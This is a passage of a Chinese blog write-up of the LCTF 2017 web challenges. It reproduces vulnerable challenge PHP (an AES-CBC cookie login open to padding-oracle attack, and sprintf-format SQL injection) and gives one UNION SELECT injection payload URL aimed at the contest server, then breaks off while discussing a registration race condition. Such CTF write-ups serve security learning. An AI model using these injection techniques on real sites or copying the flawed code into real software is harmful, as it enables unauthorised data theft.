@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        LCTF web write up - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-blog"><span class="toc-text">Simple blog</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#padding-oracle-attack"><span class="toc-text">padding oracle attack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sprintf%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%A0%E6%88%90%E6%B3%A8%E5%85%A5"><span class="toc-text">sprintf格式化字符串造成注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%90%8C%E8%90%8C%E5%93%92%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F"><span class="toc-text">萌萌哒报名系统</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C"><span class="toc-text">注册</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-text">伪协议读文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%9C%E4%BB%96%E4%BB%AC%E2%80%9D%E6%9C%89%E4%BB%80%E4%B9%88%E7%A7%98%E5%AF%86%E5%91%A2"><span class="toc-text">“他们”有什么秘密呢?</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D"><span class="toc-text">表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%97%E5%90%8D"><span class="toc-text">列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-text">无列名注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E8%8E%B7%E5%8F%96webshell"><span class="toc-text">7字符限制获取webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wanna-hack-him-%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-text">wanna hack him? （未做出）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nonce"><span class="toc-text">nonce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getflag"><span class="toc-text">getflag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95-UXSS"><span class="toc-text">拓展-UXSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BC%AA%EF%BC%89%E7%AD%BE%E5%88%B0%E9%A2%98-%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-text">（伪）签到题 （未做出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#L-PLAYGROUND-%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-text">L PLAYGROUND （未做出）</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        LCTF web write up
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2017-11-21 09:44:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#web" title="web">web</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#lctf" title="lctf">lctf</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <p>周末打一波LCTF，又被虐的不轻，昨天上了一天的课，晚上整理了一下，迟到的write up。</p>
+<span id="more"></span>
+
+
+<h3 id="Simple-blog"><a href="#Simple-blog" class="headerlink" title="Simple blog"></a>Simple blog</h3><h4 id="padding-oracle-attack"><a href="#padding-oracle-attack" class="headerlink" title="padding oracle attack"></a>padding oracle attack</h4><p>.login.php.swp拿到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/login.css&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;login&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;后台登录&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; required=&quot;required&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot; required=&quot;required&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary btn-block btn-large&quot;&gt;Login&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_token</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_token</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_token</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">get_random_token</span>();</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$id</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$token</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;token&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$token</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$id</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    	<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;token&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$c</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$token</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$u</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$username</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;select password from users where username=&#x27;&quot;</span> . <span class="variable">$username</span> . <span class="string">&quot;&#x27;&quot;</span>, <span class="variable">$con</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  		<span class="title function_ invoke__">get_identity</span>();</span><br><span class="line">  		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ./admin.php&#x27;</span>);</span><br><span class="line">  	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  		<span class="keyword">die</span>(<span class="string">&#x27;Login failed.&#x27;</span>);</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">test_identity</span>())&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ./admin.php&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_page</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>和njctf的一道题目比较相似，直接拿脚本来跑。</p>
+<h4 id="sprintf格式化字符串造成注入"><a href="#sprintf格式化字符串造成注入" class="headerlink" title="sprintf格式化字符串造成注入"></a>sprintf格式化字符串造成注入</h4><p>成功进入后台后admin.php.swp得到再次得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>])&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;You are not admin&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$id</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$title</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">		<span class="variable">$title</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;AND title=&#x27;%s&#x27;&quot;</span>, <span class="variable">$title</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$title</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM article WHERE id=&#x27;%s&#x27; <span class="subst">$title</span>&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>,<span class="variable">$con</span>);</span><br><span class="line">	<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;&lt;/h1&gt;&lt;br&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;This article does not exist.&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>sprintf造成的问题<a target="_blank" rel="noopener" href="https://paper.seebug.org/386/">https://paper.seebug.org/386/</a></p>
+<p>接下来就是常规的注入了，没什么过滤，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.231.111.54/admin.php?id=-1&amp;title=%251%24&#x27; union select 1,f14g,3 from `key`%23</span><br></pre></td></tr></table></figure>
+
+<h3 id="萌萌哒报名系统"><a href="#萌萌哒报名系统" class="headerlink" title="萌萌哒报名系统"></a>萌萌哒报名系统</h3><h4 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h4><p>首先访问<code>.idea</code>目录，得到备份文件xdcms2333.zip</p>
+<p>看了一下，重点是register.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		<span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=xdcms&#x27;</span>, <span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;mysql connected error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$admin</span> = <span class="string">&quot;xdsec&quot;</span>.<span class="string">&quot;###&quot;</span>.<span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;you_are_the_member_of_xdsec_here_is_your_flag&#x27;</span>);</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) === <span class="literal">true</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;&#x27;</span>) ? (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] : <span class="keyword">die</span>(<span class="string">&#x27;Missing username&#x27;</span>);</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">true</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] !== <span class="string">&#x27;&#x27;</span>) ? (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] : <span class="keyword">die</span>(<span class="string">&#x27;Missing password&#x27;</span>);</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]) === <span class="literal">true</span>) ? (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sth</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT username FROM users WHERE username = :username&#x27;</span>);</span><br><span class="line">    <span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">fetch</span>() !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;username has been registered&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sth</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO users (username, password) VALUES (:username, :password)&#x27;</span>);</span><br><span class="line">    <span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:password&#x27;</span> =&gt; <span class="variable">$password</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(xdsec)((?:###|\w)+)$/i&#x27;</span>, <span class="variable">$code</span>, <span class="variable">$matches</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$matches</span>) === <span class="number">3</span> &amp;&amp; <span class="variable">$admin</span> === <span class="variable">$matches</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="variable">$sth</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO identities (username, identity) VALUES (:username, :identity)&#x27;</span>);</span><br><span class="line">        <span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:identity&#x27;</span> =&gt; <span class="variable">$matches</span>[<span class="number">1</span>]]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$sth</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;INSERT INTO identities (username, identity) VALUES (:username, &quot;GUEST&quot;)&#x27;</span>);</span><br><span class="line">        <span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;register success&quot;);location.href=&quot;./index.html&quot;&lt;/script&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>重点是下面两行代码，满足条件即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="string">&quot;xdsec&quot;</span>.<span class="string">&quot;###&quot;</span>.<span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;you_are_the_member_of_xdsec_here_is_your_flag&#x27;</span>);</span><br><span class="line"><span class="comment">/*blabla*/</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(xdsec)((?:###|\w)+)$/i&#x27;</span>, <span class="variable">$code</span>, <span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure>
+
+<p>满屏的pdo，注入是没戏了，总结一下我知道的解法：</p>
+<ol>
+<li><p>人品 </p>
+<p>某表哥跑脚本注册了100个用户，其中一个真的满足条件了。。。我怀疑表哥一生中中彩票的机会在这给用了。</p>
+</li>
+<li><p>条件竞争</p>
+<p>比赛结束后交流发现很多师傅（包括我们）都用的这个方法。在做题过程中发现当注册的人数过多时，后台会清空数据库，来看<code>index.php</code>这段代码</p>
